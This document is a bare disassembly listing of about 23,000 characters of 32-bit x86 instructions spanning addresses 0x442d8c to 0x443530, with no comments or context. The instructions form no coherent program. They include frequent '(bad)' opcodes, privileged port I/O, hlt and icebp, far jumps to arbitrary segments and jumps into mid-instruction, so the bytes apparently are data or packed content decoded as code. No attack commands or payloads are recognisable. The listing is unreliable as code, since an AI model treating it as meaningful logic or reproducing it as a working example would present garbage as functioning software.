  442d8c:	mov    esi,0xb12e8a12
  442d91:	hlt    
  442d92:	or     BYTE PTR [edx+0xa5c788c],cl
  442d98:	ss xor eax,0x8e726084
  442d9e:	inc    ebx
  442d9f:	test   eax,0x100e5aea
  442da4:	pop    ds
  442da5:	xor    al,0xc4
  442da7:	push   edx
  442da8:	mov    es,WORD PTR [edx+0x78]
  442dab:	and    DWORD PTR [esi+esi*2-0xd],ebp
  442daf:	test   eax,0xa2495bce
  442db4:	sub    DWORD PTR [ecx],esp
  442db6:	jl     0x442e12
  442db8:	test   dl,ah
  442dba:	loop   0x442d5e
  442dbc:	fisubr WORD PTR [esi+eiz*2-0x56]
  442dc0:	retf   0xac0
  442dc3:	sub    BYTE PTR [ebx-0x6f],ah
  442dc6:	inc    esi
  442dc7:	add    BYTE PTR [esi+0x68c86b],cl
  442dcd:	pusha  
  442dce:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442dcf:	in     eax,dx
  442dd0:	mov    ds:0x8c1e32fd,al
  442dd5:	jno    0x442da2
  442dd7:	mov    al,ds:0xc0342525
  442ddc:	fiadd  DWORD PTR [edi]
  442dde:	add    bl,BYTE PTR [ebx-0x353fe39c]
  442de4:	dec    eax
  442de5:	test   al,0x7b
  442de7:	hlt    
  442de8:	dec    edx
  442de9:	sub    eax,edx
  442deb:	sbb    DWORD PTR [eax],edx
  442ded:	(bad)  
  442def:	outs   dx,DWORD PTR ds:[esi]
  442df0:	out    dx,al
  442df1:	and    al,0xb5
  442df3:	punpckhbw mm3,QWORD PTR [esi+0x69]
  442df7:	pop    eax
  442df8:	rol    BYTE PTR [edx+0x4189151a],cl
  442dfe:	test   eax,0x5de64812
  442e03:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  442e04:	inc    edi
  442e05:	adc    dh,BYTE PTR [esi]
  442e07:	dec    esp
  442e08:	add    bh,BYTE PTR [ebp-0x4]
  442e0b:	les    edx,FWORD PTR [edx]
  442e0d:	and    BYTE PTR [edx-0x3b],bl
  442e10:	xchg   DWORD PTR [edx+eax*4],ebx
  442e13:	sbb    ebp,DWORD PTR cs:[eax]
  442e16:	mov    ds:0xa45fe699,eax
  442e1b:	mov    dh,cl
  442e1d:	adc    bl,BYTE PTR [ebx]
  442e1f:	add    BYTE PTR [ebx],ah
  442e21:	xchg   edi,eax
  442e22:	add    BYTE PTR [ebx],bh
  442e24:	jnp    0x442ddb
  442e26:	lods   eax,DWORD PTR ds:[esi]
  442e27:	pop    edi
  442e28:	mov    al,0x16
  442e2a:	outs   dx,BYTE PTR ds:[esi]
  442e2b:	fs sbb al,0x70
  442e2e:	inc    esi
  442e2f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  442e30:	mov    dh,0x2b
  442e32:	inc    eax
  442e33:	aas    
  442e34:	mov    dh,0xac
  442e36:	in     eax,dx
  442e37:	repnz test eax,0x332372a0
  442e3d:	cmc    
  442e3e:	mov    al,BYTE PTR [edx]
  442e40:	fmul   QWORD PTR [esi+0x0]
  442e43:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  442e44:	shl    dh,1
  442e46:	and    eax,0x7cf672e3
  442e4b:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  442e4c:	mov    esi,0xea2df7d4
  442e51:	mov    al,ds:0xc67ece70
  442e56:	sahf   
  442e57:	add    al,0x36
  442e59:	lock aad 0x14
  442e5c:	xchg   edx,eax
  442e5d:	jbe    0x442ec3
  442e5f:	loop   0x442e27
  442e61:	push   cs
  442e62:	xor    eax,0xbf136f47
  442e67:	mov    ah,0x48
  442e69:	sbb    al,BYTE PTR [esi+0x68]
  442e6c:	adc    al,0xc
  442e6e:	jge    0x442e72
  442e70:	test   DWORD PTR [ebx+0x1a],edx
  442e73:	scas   al,BYTE PTR es:[edi]
  442e74:	punpckhbw mm7,QWORD PTR [ebp+0x42]
  442e78:	cmove  edi,DWORD PTR [edi+0x71]
  442e7c:	push   cs
  442e7d:	sbb    BYTE PTR [ecx-0x55755bf9],ch
  442e83:	sar    dl,1
  442e85:	inc    edx
  442e86:	popa   
  442e87:	mov    dh,0x3
  442e89:	loopne 0x442e8e
  442e8b:	test   BYTE PTR [eax+ebp*4],bh
  442e8e:	repnz popa 
  442e90:	cs pop edx
  442e92:	(bad)  
  442e93:	(bad)  [ebp-0x6b655b21]
  442e99:	jmp    0x4cd5:0xd265bb46
  442ea0:	and    al,0x3e
  442ea2:	dec    ebx
  442ea3:	inc    eax
  442ea4:	dec    eax
  442ea5:	cs or  al,0x1e
  442ea8:	adc    al,0x84
  442eaa:	sar    DWORD PTR [edx+0x45a1632],0x5d
  442eb1:	sub    BYTE PTR [eax+0x26],0xec
  442eb5:	in     eax,dx
  442eb6:	push   eax
  442eb7:	test   eax,0x653855ad
  442ebc:	sahf   
  442ebd:	mov    al,ds:0x1010a6bd
  442ec2:	mov    ebx,0xd8403da
  442ec7:	cmp    BYTE PTR [edx+0x10eb34af],0x5f
  442ece:	test   BYTE PTR [edi-0x28],al
  442ed1:	sbb    bh,al
  442ed3:	es (bad) 
  442ed5:	mov    WORD PTR [esi+0x402d35f0],ss
  442edb:	add    eax,0xce8ca1c2
  442ee0:	xor    al,0x18
  442ee2:	cs dec ebp
  442ee4:	ror    DWORD PTR [edi-0x22],1
  442ee7:	out    dx,al
  442ee8:	cmp    esi,edi
  442eea:	popf   
  442eeb:	add    esp,edi
  442eed:	push   ss
  442eee:	pop    esp
  442eef:	mov    DWORD PTR [eax+0x71],ebp
  442ef2:	scas   al,BYTE PTR es:[edi]
  442ef3:	fsub   DWORD PTR [edx-0x5f5216b2]
  442ef9:	mov    eax,ds:0x6c0694c3
  442efe:	push   cs
  442eff:	xchg   ebp,eax
  442f00:	xchg   esi,eax
  442f01:	popf   
  442f02:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  442f03:	and    eax,0x6a281d43
  442f08:	pop    esi
  442f09:	sub    al,0x9e
  442f0b:	mov    esp,0xa12ec776
  442f10:	mov    ch,0x2b
  442f12:	rcr    DWORD PTR es:[esi-0x19],0x40
  442f17:	pop    ss
  442f18:	mov    ah,0x48
  442f1a:	mov    ebp,0x828c8510
  442f1f:	xor    ah,bl
  442f21:	scas   al,BYTE PTR es:[edi]
  442f22:	das    
  442f23:	push   ecx
  442f24:	das    
  442f25:	pop    esp
  442f26:	icebp  
  442f27:	inc    edi
  442f28:	mov    esi,0xeb5c8d4
  442f2d:	and    DWORD PTR [eax-0x66b1a15a],eax
  442f33:	pop    esi
  442f34:	jmp    0x69a:0xa2b65d10
  442f3b:	and    dl,al
  442f3d:	jne    0x442f97
  442f3f:	cmp    BYTE PTR [edx+0x1574d004],dl
  442f45:	push   es
  442f46:	outs   dx,BYTE PTR ds:[esi]
  442f47:	dec    ch
  442f49:	ins    BYTE PTR es:[edi],dx
  442f4a:	cmp    esi,DWORD PTR [eax+0x23f44784]
  442f50:	pop    edi
  442f51:	sahf   
  442f52:	push   ds
  442f53:	inc    esi
  442f54:	shl    BYTE PTR [ebx],0x5b
  442f57:	ins    DWORD PTR es:[edi],dx
  442f58:	loopne 0x442f52
  442f5a:	or     al,bh
  442f5c:	cmp    BYTE PTR [ecx],0xc2
  442f5f:	mov    eax,0xc0525d2d
  442f64:	sbb    eax,DWORD PTR [esi+0x50]
  442f67:	inc    esp
  442f68:	leave  
  442f69:	inc    eax
  442f6a:	in     al,dx
  442f6b:	inc    esi
  442f6c:	mov    ds:0x8cb4ab5,ax
  442f72:	ins    BYTE PTR es:[edi],dx
  442f73:	popa   
  442f74:	loop   0x442fec
  442f76:	out    dx,al
  442f77:	mov    ebp,0x70a2a6
  442f7c:	push   esp
  442f7d:	outs   dx,BYTE PTR ds:[esi]
  442f7e:	xor    BYTE PTR [eax+esi*4+0x55b5a2ab],dl
  442f85:	sub    cl,cl
  442f87:	mov    ?,esi
  442f89:	add    al,0xa7
  442f8b:	pop    esp
  442f8c:	(bad)  
  442f8d:	in     al,dx
  442f8e:	pop    ss
  442f8f:	ins    BYTE PTR es:[edi],dx
  442f90:	adc    al,0x4a
  442f92:	mov    dl,BYTE PTR [eax]
  442f94:	(bad)  
  442f95:	out    0x8,al
  442f97:	sbb    al,0x2b
  442f99:	jmp    0x350b20b3
  442f9e:	pop    edx
  442f9f:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  442fa0:	pop    es
  442fa1:	ss jbe 0x442f82
  442fa4:	sbb    BYTE PTR [ebx-0x70],ch
  442fa7:	(bad)  
  442fa9:	jo     0x44300c
  442fab:	add    cl,BYTE PTR [edi+0x72df3842]
  442fb1:	in     eax,dx
  442fb2:	adc    eax,0xc502065
  442fb7:	scas   eax,DWORD PTR es:[edi]
  442fb8:	jmp    0x4f53:0x40533d44
  442fbf:	mov    dl,0xd5
  442fc1:	mov    ds:0x3d2aa109,al
  442fc6:	mov    ah,0xa
  442fc8:	repz mov WORD PTR [edx-0x6a],ds
  442fcc:	(bad)  
  442fcd:	and    ah,dl
  442fcf:	and    BYTE PTR [ecx],bl
  442fd1:	mov    dl,0xb6
  442fd3:	mov    al,0x28
  442fd5:	push   0x6d
  442fd7:	jnp    0x442f6b
  442fd9:	jg     0x442f75
  442fdb:	sbb    DWORD PTR [eax-0x72],ebp
  442fde:	sbb    eax,0xe387c52
  442fe3:	test   al,0x25
  442fe5:	sbb    al,0xc0
  442fe7:	xor    BYTE PTR [esi+0x2c],ch
  442fea:	call   0xa9ee:0x2420986c
  442ff1:	test   DWORD PTR [esi+0x2580a047],ecx
  442ff7:	repnz adc bl,BYTE PTR [eax]
  442ffa:	pop    ebx
  442ffb:	jmp    0x443075
  442ffd:	adc    al,0xc
  442fff:	inc    edx
  443000:	push   esp
  443001:	aad    0x8e
  443003:	jmp    0x443081
  443005:	in     al,0xcd
  443007:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  443008:	lods   eax,DWORD PTR ds:[esi]
  443009:	pop    ebp
  44300a:	dec    ebx
  44300b:	pop    esi
  44300c:	rcr    ah,0x15
  44300f:	mov    BYTE PTR [ebx+0x4c5a91ba],ch
  443015:	imul   ebx,DWORD PTR [eax-0x695fd70a],0xffffff81
  44301c:	and    ah,cl
  44301e:	bound  ecx,QWORD PTR [ebp+0x475b6ec0]
  443024:	inc    edi
  443025:	cmp    edi,esp
  443027:	pop    ss
  443028:	sbb    al,0xb5
  44302a:	pop    sp
  44302c:	add    ch,ah
  44302e:	jo     0x442fb3
  443030:	xor    eax,0x4ac2dbaa
  443035:	jle    0x443035
  443037:	loope  0x4430a5
  443039:	xor    al,0x42
  44303b:	sub    al,0x2c
  44303d:	mov    eax,0x108510c0
  443042:	push   cs
  443043:	scas   al,BYTE PTR es:[edi]
  443044:	mov    ds:0x1a051f7e,al
  443049:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  44304a:	das    
  44304b:	mov    ah,0x28
  44304d:	outs   dx,BYTE PTR ds:[esi]
  44304e:	dec    esi
  44304f:	xor    al,BYTE PTR [ebp-0x772ebcbc]
  443055:	loopne 0x4430ca
  443057:	and    BYTE PTR [ebx],cl
  443059:	pop    esi
  44305a:	sbb    eax,0x80cf8a4
  44305f:	xchg   edx,eax
  443060:	xchg   edi,eax
  443061:	stos   DWORD PTR es:[edi],eax
  443062:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  443063:	mov    al,ds:0x5c5a4a7d
  443068:	jp     0x442ff6
  44306a:	adc    al,bh
  44306c:	pop    esi
  44306d:	inc    ecx
  44306e:	mov    dl,0xb0
  443070:	shr    DWORD PTR [ebp-0x10],0xf2
  443074:	std    
  443075:	xchg   esi,eax
  443076:	stos   DWORD PTR es:[edi],eax
  443077:	push   eax
  443078:	sar    BYTE PTR [eax],1
  44307a:	(bad)  
  44307b:	clc    
  44307c:	mov    al,0x40
  44307e:	xchg   esp,eax
  44307f:	(bad)  
  443080:	sub    eax,edi
  443082:	and    al,0x6a
  443084:	dec    esi
  443085:	and    eax,0x8acae3cc
  44308a:	int3   
  44308b:	fwait
  44308c:	jbe    0x44308f
  44308e:	mov    al,ds:0x884a223c
  443093:	(bad)  
  443094:	out    0x17,al
  443096:	add    esi,DWORD PTR [esp+edi*2]
  443099:	pop    ecx
  44309a:	mov    ds:0x4cb93a53,al
  44309f:	test   BYTE PTR [esi-0x6fe95a47],ah
  4430a5:	mov    dl,0xc
  4430a7:	shr    BYTE PTR [edi+eax*2],cl
  4430aa:	rcl    DWORD PTR ds:0x590cc126,0xf6
  4430b1:	ror    DWORD PTR [edi],0x6b
  4430b4:	xchg   ebx,eax
  4430b5:	or     al,0xbf
  4430b7:	or     eax,0xc0742252
  4430bc:	push   es
  4430bd:	shl    BYTE PTR [eax],1
  4430bf:	xor    al,0xb8
  4430c1:	add    al,0x0
  4430c3:	jecxz  0x4430a6
  4430c5:	adc    DWORD PTR [edi+edx*2+0x1e6cf37c],esp
  4430cc:	xor    al,dl
  4430ce:	(bad)  
  4430cf:	data16 clc 
  4430d1:	add    eax,0x4482d1ac
  4430d6:	mov    eax,0xb6a5e60d
  4430db:	loop   0x4430a8
  4430dd:	ds es (bad) 
  4430e0:	mov    dh,0xd8
  4430e2:	inc    esi
  4430e3:	test   eax,0x78434bd6
  4430e8:	inc    edx
  4430e9:	(bad)  
  4430ea:	jge    0x443136
  4430ec:	retf   0x519d
  4430ef:	sub    cl,ch
  4430f1:	ret    
  4430f2:	xor    BYTE PTR [eax+0x16],0x8e
  4430f6:	call   0x1d0a:0x902c2cba
  4430fd:	sbb    al,0x45
  4430ff:	and    al,0x8
  443101:	adc    eax,0x1f925e30
  443106:	rol    BYTE PTR [edx+0x16eb7676],1
  44310c:	push   edx
  44310d:	nop
  44310e:	lahf   
  44310f:	fcmovnbe st,st(0)
  443111:	(bad)  
  443112:	mov    esp,0x100106ac
  443117:	and    esp,DWORD PTR [edx+0xcd800f5]
  44311d:	loop   0x4430de
  44311f:	lods   al,BYTE PTR ds:[esi]
  443120:	repnz dec ecx
  443122:	aas    
  443123:	push   cs
  443124:	fs jl  0x4430bd
  443127:	add    BYTE PTR [edi+edx*1-0x7a],dl
  44312b:	shl    BYTE PTR [esi],cl
  44312d:	pop    esi
  44312e:	push   ecx
  44312f:	or     eax,DWORD PTR [esi]
  443131:	cmp    DWORD PTR [edx+0x4a89574],eax
  443137:	mov    fs,WORD PTR [eax+0xcd9ec9f]
  44313d:	push   esp
  44313e:	stc    
  44313f:	cmc    
  443140:	enter  0x6b40,0xce
  443144:	cmp    ch,dh
  443146:	js     0x44316e
  443148:	ins    BYTE PTR es:[edi],dx
  443149:	aaa    
  44314a:	push   ss
  44314b:	push   esp
  44314c:	fist   DWORD PTR [ebx+0x8fa29aa]
  443152:	push   esp
  443153:	mov    dh,BYTE PTR [ebx]
  443155:	or     al,dl
  443157:	test   DWORD PTR [esi-0x7fbfff4f],ebp
  44315d:	xchg   esp,eax
  44315e:	fcomi  st,st(0)
  443160:	add    DWORD PTR [ebx-0x65],ebp
  443163:	daa    
  443164:	je     0x44317a
  443166:	sub    al,0xf7
  443168:	repnz push ss
  44316a:	(bad)  
  44316b:	and    bl,BYTE PTR [edx+0x4810c220]
  443171:	mov    al,0xda
  443173:	stos   BYTE PTR es:[edi],al
  443174:	mov    fs,WORD PTR [eax-0x6ff7f94f]
  44317a:	and    eax,0x8ca651a6
  44317f:	sbb    DWORD PTR [esi+0x53],0xf0ce20ea
  443186:	or     BYTE PTR [ecx+0x57],ch
  443189:	mov    eax,ds:0xa3ce9f84
  44318e:	jle    0x4431ce
  443190:	cwde   
  443191:	fdiv   DWORD PTR [eax+0x5c]
  443194:	mov    ebx,0xb4f97756
  443199:	pusha  
  44319a:	pop    ebp
  44319b:	pop    es
  44319c:	mov    al,ds:0x8f78125f
  4431a1:	push   edx
  4431a2:	xchg   edx,eax
  4431a3:	call   0x541695cc
  4431a8:	sub    ah,dh
  4431aa:	jle    0x443176
  4431ac:	push   es
  4431ad:	push   ds
  4431ae:	push   ecx
  4431af:	out    0xac,al
  4431b1:	ret    
  4431b2:	or     bl,BYTE PTR [esi+0x6d]
  4431b5:	jmp    0x8700:0x942e2752
  4431bc:	(bad)  
  4431bd:	adc    bl,BYTE PTR [ecx-0x79]
  4431c0:	add    DWORD PTR [edi],ecx
  4431c2:	xchg   edx,eax
  4431c3:	dec    edx
  4431c4:	fcmovb st,st(6)
  4431c6:	pusha  
  4431c7:	adc    eax,edx
  4431c9:	dec    ebx
  4431ca:	popa   
  4431cb:	(bad)  
  4431cc:	mov    ah,0x0
  4431ce:	scas   eax,DWORD PTR es:[edi]
  4431cf:	sub    al,0x80
  4431d1:	mov    dh,0x75
  4431d3:	sbb    eax,0x14a9716
  4431d8:	adc    BYTE PTR [edx+0x26],dh
  4431db:	mov    al,ds:0x3d4970da
  4431e0:	xor    dl,bh
  4431e2:	stc    
  4431e3:	icebp  
  4431e4:	push   0xffffffe0
  4431e6:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  4431e7:	jle    0x443241
  4431e9:	fmul   st,st(0)
  4431eb:	push   ebp
  4431ec:	ret    
  4431ed:	into   
  4431ee:	jg     0x4431ba
  4431f0:	ds push 0x6d4c4f6c
  4431f6:	lods   al,BYTE PTR ds:[esi]
  4431f7:	xor    eax,0x5340c4
  4431fc:	imul   ebx,ebp,0x10
  4431ff:	clc    
  443200:	inc    esi
  443201:	xor    BYTE PTR [edi+0x14c782a0],0x8a
  443208:	call   0x5903ce57
  44320d:	mov    ah,0x1
  44320f:	and    dl,BYTE PTR [ebx]
  443211:	or     eax,0x82c03fce
  443216:	xchg   DWORD PTR [eax+0x27],esp
  443219:	fbld   TBYTE PTR [edi]
  44321b:	adc    ah,BYTE PTR [eax-0x5e]
  44321e:	push   esp
  44321f:	sbb    BYTE PTR [edx+edx*1-0x3e],bl
  443223:	cmp    al,0x5f
  443225:	test   al,0x47
  443227:	mov    edx,0x8a35049f
  44322c:	test   al,0x96
  44322e:	push   cs
  44322f:	cli    
  443230:	shl    BYTE PTR [esi],0x76
  443233:	sbb    al,0x51
  443235:	fs pop edi
  443237:	push   esp
  443238:	and    ecx,esi
  44323a:	xchg   esi,eax
  44323b:	movs   BYTE PTR es:[edi],BYTE PTR cs:[esi]
  44323d:	mov    ds,WORD PTR ds:0xf437a6ec
  443243:	adc    bl,al
  443245:	inc    esp
  443246:	mov    edx,0x1cb6994c
  44324b:	mov    bl,0xb0
  44324d:	rcl    dh,0x60
  443250:	fimul  WORD PTR [edx]
  443252:	dec    ecx
  443253:	add    BYTE PTR [edi+0x71],ah
  443256:	aam    0xf3
  443258:	inc    eax
  443259:	imul   eax,DWORD PTR [eax-0x65],0x17
  44325d:	jl     0x4432b2
  44325f:	shl    BYTE PTR [ebx+0x6181ea],1
  443265:	iret   
  443266:	pop    esp
  443267:	mov    eax,ds:0xa0cfa4b
  44326c:	pop    edx
  44326d:	sub    edx,ebp
  44326f:	pop    edx
  443270:	push   ebx
  443271:	mov    ah,0xe3
  443273:	clc    
  443274:	test   eax,0xda374848
  443279:	sbb    edx,esi
  44327b:	mov    ?,ebp
  44327d:	add    eax,0xcc14cbf1
  443282:	out    dx,eax
  443283:	jp     0x4432e3
  443285:	pop    ecx
  443286:	sti    
  443287:	push   0x4445f1e1
  44328c:	(bad)  
  44328d:	and    BYTE PTR [edx],cl
  44328f:	ja     0x4432fb
  443291:	dec    ebp
  443292:	add    eax,0xa0cc2dc2
  443297:	push   edx
  443298:	xor    al,0xab
  44329a:	ins    DWORD PTR es:[edi],dx
  44329b:	jo     0x4432a6
  44329d:	sub    bh,BYTE PTR [eax-0x46]
  4432a0:	dec    ebp
  4432a1:	jbe    0x44331c
  4432a3:	fcmovnu st,st(0)
  4432a5:	lock push 0x5914073e
  4432ab:	ss xor al,0x1
  4432ae:	and    ch,bl
  4432b0:	push   0x2f90ded8
  4432b5:	adc    ah,dh
  4432b7:	push   ecx
  4432b8:	sbb    BYTE PTR [edx],dl
  4432ba:	push   edx
  4432bb:	xor    BYTE PTR [ecx],0xc6
  4432be:	es push eax
  4432c0:	cmp    ebx,DWORD PTR [edx-0x3fec549]
  4432c6:	out    dx,al
  4432c7:	or     eax,0x8981c667
  4432cc:	iret   
  4432cd:	inc    esi
  4432ce:	dec    ebp
  4432cf:	in     al,0xe8
  4432d1:	mov    edx,0x4d4063b4
  4432d6:	jb     0x4432eb
  4432d8:	sub    al,0x8b
  4432da:	mov    esi,0x15ae68ba
  4432df:	push   es
  4432e0:	dec    esi
  4432e1:	inc    esi
  4432e2:	dec    esi
  4432e3:	sub    dl,BYTE PTR [esi+ebx*2]
  4432e6:	adc    al,0x9e
  4432e8:	and    al,0x75
  4432ea:	sar    esp,1
  4432ec:	dec    dl
  4432ee:	sub    DWORD PTR [ebx+0x1b],0x15
  4432f2:	xor    BYTE PTR [edx+0x4b],dl
  4432f5:	adc    BYTE PTR [edi],dl
  4432f7:	xchg   esi,eax
  4432f8:	sbb    ch,BYTE PTR [ecx-0x43fc31b1]
  4432fe:	jmp    0x9e44:0x8030bc20
  443305:	call   0x86518ea8
  44330a:	scas   al,BYTE PTR es:[edi]
  44330b:	sbb    ah,dh
  44330d:	push   0x1d
  44330f:	adc    ch,BYTE PTR [edx-0x407f07c]
  443315:	jl     0x443360
  443317:	sub    edx,DWORD PTR [eax]
  443319:	adc    eax,DWORD PTR [edi]
  44331b:	push   edx
  44331c:	mov    WORD PTR [esi],?
  44331e:	cmp    al,0xf2
  443320:	adc    BYTE PTR [ecx],al
  443322:	test   BYTE PTR [edx+ebx*2],dh
  443325:	add    ecx,DWORD PTR [eax+0x50d0c2ac]
  44332b:	push   0x1d
  44332d:	data16 je 0x443304
  443330:	(bad)  
  443331:	jmp    0xdacba324
  443336:	pop    es
  443337:	test   al,0x88
  443339:	scas   eax,DWORD PTR es:[edi]
  44333a:	test   al,0xa3
  44333c:	ins    BYTE PTR es:[edi],dx
  44333d:	push   ss
  44333e:	dec    ebx
  44333f:	pop    edx
  443340:	ds push 0x57
  443343:	(bad)  
  443344:	out    dx,eax
  443345:	int3   
  443346:	jle    0x44331c
  443348:	add    eax,0xf0329058
  44334d:	push   es
  44334e:	dec    ecx
  44334f:	inc    edi
  443350:	nop
  443351:	rcl    BYTE PTR [edx],cl
  443353:	or     al,al
  443355:	xchg   edi,eax
  443356:	sub    BYTE PTR [eax+edi*4-0x1b],ch
  44335a:	or     eax,0x2f8d66b0
  44335f:	add    DWORD PTR ds:0xd0049d92,eax
  443365:	pop    es
  443366:	sub    al,BYTE PTR [ecx]
  443368:	cmp    al,al
  44336a:	xchg   edx,eax
  44336b:	jbe    0x443349
  44336d:	inc    esi
  44336e:	mov    ds:0xe097d160,eax
  443373:	out    dx,al
  443374:	xchg   ebp,eax
  443375:	shl    BYTE PTR [edi-0x12f2727a],0xa
  44337c:	dec    esp
  44337d:	test   esp,ebx
  44337f:	daa    
  443380:	or     BYTE PTR [edi+0x44],al
  443383:	push   0x6025c362
  443388:	pop    ebx
  443389:	add    al,BYTE PTR [ecx+0x68]
  44338c:	dec    ebx
  44338d:	or     esi,DWORD PTR ds:0xc2fd0e74
  443393:	xor    al,0x81
  443395:	push   es
  443396:	aaa    
  443397:	lods   al,BYTE PTR ds:[esi]
  443398:	outs   dx,BYTE PTR ds:[esi]
  443399:	sbb    dh,BYTE PTR [edx+eiz*8]
  44339c:	xchg   edx,eax
  44339d:	mov    ch,0xf0
  44339f:	inc    ebx
  4433a0:	inc    esp
  4433a1:	adc    DWORD PTR [esi+0x63],edi
  4433a4:	adc    al,BYTE PTR [edi+eax*1+0x20e5a50]
  4433ab:	xor    edx,DWORD PTR [esp+edx*8+0x70]
  4433af:	or     BYTE PTR [edx+eax*2],ch
  4433b2:	mov    DWORD PTR [ebx],ebx
  4433b4:	dec    esi
  4433b5:	and    ah,dh
  4433b7:	xor    esp,DWORD PTR [ebx+0xb]
  4433ba:	sub    BYTE PTR [eax],dl
  4433bc:	fcom   QWORD PTR [edi]
  4433be:	js     0x443350
  4433c0:	push   esi
  4433c1:	sub    DWORD PTR [ebp+0xae9ce67],0x5ef081d4
  4433cb:	jae    0x4433e6
  4433cd:	mov    eax,0xf853532
  4433d2:	test   al,0x36
  4433d4:	inc    eax
  4433d5:	inc    esi
  4433d6:	jmp    0xa600:0x612e46ac
  4433dd:	push   ds
  4433de:	push   esp
  4433df:	(bad)  
  4433e0:	pop    ss
  4433e1:	jbe    0x44340f
  4433e3:	mov    fs,WORD PTR [ecx+edx*1]
  4433e6:	push   ss
  4433e7:	scas   al,BYTE PTR es:[edi]
  4433e8:	dec    eax
  4433e9:	jns    0x4433b0
  4433eb:	sbb    DWORD PTR [edx],0xb2c38a42
  4433f1:	add    al,0x0
  4433f3:	pop    edi
  4433f4:	(bad)  
  4433f5:	das    
  4433f6:	adc    edx,DWORD PTR ds:0x5a6ee494
  4433fc:	js     0x44338a
  4433fe:	(bad)  
  443400:	sbb    al,0xeb
  443402:	push   edx
  443403:	dec    edi
  443404:	ins    BYTE PTR es:[edi],dx
  443405:	adc    cl,ah
  443407:	mov    edi,DWORD PTR [edx]
  443409:	inc    eax
  44340a:	pop    ebp
  44340b:	dec    ecx
  44340c:	jo     0x4433c7
  44340e:	inc    edx
  44340f:	mov    ds:0x80476c00,eax
  443414:	cmp    dl,BYTE PTR [esi+ebx*2]
  443417:	mov    bh,0x20
  443419:	add    eax,0xe6705861
  44341e:	scas   al,BYTE PTR es:[edi]
  44341f:	ins    BYTE PTR es:[edi],dx
  443420:	push   ds
  443421:	adc    al,0x92
  443423:	call   0x5ee4:0xeb5b133
  44342a:	pop    eax
  44342b:	jno    0x4433eb
  44342d:	ins    DWORD PTR es:[edi],dx
  44342e:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
  44342f:	movs   BYTE PTR es:[edi],BYTE PTR ds:[esi]
  443430:	push   eax
  443431:	lods   eax,DWORD PTR ds:[esi]
  443432:	mov    eax,esp
  443434:	dec    ebx
  443435:	xchg   esp,eax
  443436:	adc    BYTE PTR [edi+esi*8+0x47a2c4d7],0xf6
  44343e:	hlt    
  44343f:	ds aas 
  443441:	movups xmm7,XMMWORD PTR [ebp+0x6d]
  443445:	loop   0x4433fc
  443447:	mov    DWORD PTR [ebp+0x101af586],esp
  44344d:	pop    esi
  44344e:	fdivr  DWORD PTR [edx-0x4a]
  443451:	loope  0x44342c
  443453:	(bad)  
  443454:	(bad)
  443458:	icebp  
  443459:	sub    dh,0xe8
  44345c:	jb     0x4434b6
  44345e:	cs push 0x6bdca0ed
  443464:	dec    esi
  443465:	adc    BYTE PTR [eax],ch
  443467:	push   ds
  443468:	inc    eax
  443469:	popf   
  44346a:	and    ah,dl
  44346c:	push   esp
  44346d:	cs cmc 
  44346f:	push   ds
  443470:	adc    eax,DWORD PTR [ecx+0x61c632d7]
  443476:	loopne 0x4434da
  443478:	add    dh,BYTE PTR [ebp+ebx*2+0x7435c7e0]
  44347f:	adc    eax,0x434f2d3a
  443484:	inc    edi
  443485:	jae    0x443483
  443487:	retf   0x8f2
  44348a:	jle    0x443420
  44348c:	sbb    bl,BYTE PTR [eax]
  44348e:	test   eax,0x45fa89ec
  443493:	arpl   WORD PTR [edi-0x66],bp
  443496:	fsub   DWORD PTR ds:0xb286094a
  44349c:	push   ds
  44349d:	fs sbb al,0xa
  4434a0:	movs   DWORD PTR es:[edi],DWORD PTR ds:[esi]
  4434a1:	mov    ebx,0x4602ad1e
  4434a6:	js     0x4434c4
  4434a8:	fisub  WORD PTR [edx-0x1d]
  4434ab:	push   cs
  4434ac:	add    al,0x74
  4434ae:	add    eax,eax
  4434b0:	add    BYTE PTR [esi+edx*1],cl
  4434b3:	jmp    0x44352f
  4434b5:	inc    esp
  4434b6:	call   0x5b38475c
  4434bb:	xchg   edx,eax
  4434bc:	mov    ecx,0xd28db443
  4434c1:	fcom   DWORD PTR [esi+esi*1-0x1f4189c9]
  4434c8:	test   eax,0xe46874da
  4434cd:	stos   BYTE PTR es:[edi],al
  4434ce:	mov    dl,0xa6
  4434d0:	jne    0x443492
  4434d2:	xchg   edx,eax
  4434d3:	or     dh,BYTE PTR [eax+0x9]
  4434d6:	lods   al,BYTE PTR ds:[esi]
  4434d7:	lods   eax,DWORD PTR ds:[esi]
  4434d8:	mov    dl,0xa2
  4434da:	mov    dl,0x40
  4434dc:	add    cl,bl
  4434de:	or     esi,edx
  4434e0:	jmp    FWORD PTR [edi-0x4e]
  4434e3:	push   edx
  4434e4:	cmp    BYTE PTR [eax],ah
  4434e6:	mov    eax,ds:0xa08bdead
  4434eb:	cmp    ecx,edx
  4434ed:	fisubr DWORD PTR [eax-0x12bc3d80]
  4434f3:	scas   al,BYTE PTR es:[edi]
  4434f4:	pop    edx
  4434f5:	jle    0x443555
  4434f7:	div    DWORD PTR [ebx+eax*2+0x5af415eb]
  4434fe:	cmp    al,0x6b
  443500:	jbe    0x443517
  443502:	push   esi
  443503:	sbb    dl,BYTE PTR [esp-0x3f]
  443507:	mov    dh,0xeb
  443509:	mov    al,ds:0xcc0a3e62
  44350e:	pop    ss
  44350f:	lea    esp,[edi-0x1d]
  443512:	aaa    
  443513:	push   0x2d
  443515:	adc    dl,BYTE PTR [esi]
  443517:	in     eax,0x15
  443519:	clts   
  44351b:	shl    BYTE PTR [eax-0xc],1
  44351e:	push   esp
  44351f:	xor    DWORD PTR [esi+0x75],eax
  443522:	pop    ds
  443523:	and    DWORD PTR [ecx-0x37fc63b6],esp
  443529:	frstor [eax-0x2d]
  44352c:	stos   BYTE PTR es:[edi],al
  44352d:	daa    
  44352e:	inc    ecx
  44352f:	cwde   
  443530:	cmps   BYTE PTR ds:[esi],BYTE PTR es:[edi]
